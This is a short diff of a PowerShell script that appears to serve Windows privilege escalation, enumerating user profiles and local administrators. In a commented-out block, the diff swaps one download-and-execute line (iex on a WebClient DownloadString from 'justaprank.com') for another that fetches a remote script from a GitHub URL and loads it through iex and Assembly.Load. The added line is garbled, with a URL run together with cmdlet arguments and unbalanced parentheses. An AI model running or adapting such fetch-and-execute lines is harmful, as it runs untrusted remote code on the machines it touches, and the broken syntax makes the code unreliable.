@@ -9,6 +9,7 @@ Get-ChildItem C:\Users -Force | Select-Object Name ### Lists all user profiles o
 net localgroup administrators ### Lists all administrator groups
 
 # Loads PS Script into a variable (Will use later...)
-<# $url = ‘https://www.justaprank.com/scripts/script1.ps1′
-iex (New-Object Net.WebClient).DownloadString($url)
+<# 
+$url = ‘https://github.com/dr0pp3dpack3ts/z3r0collectives/# A Windows Privilege Escalation!.ps1 -UseBasicParsing | Select-Object -ExpandProperty Content))′
+$wp=[System.Reflection.Assembly]::Load([byte[](iex (New-Object Net.WebClient).DownloadString($url))
 #>
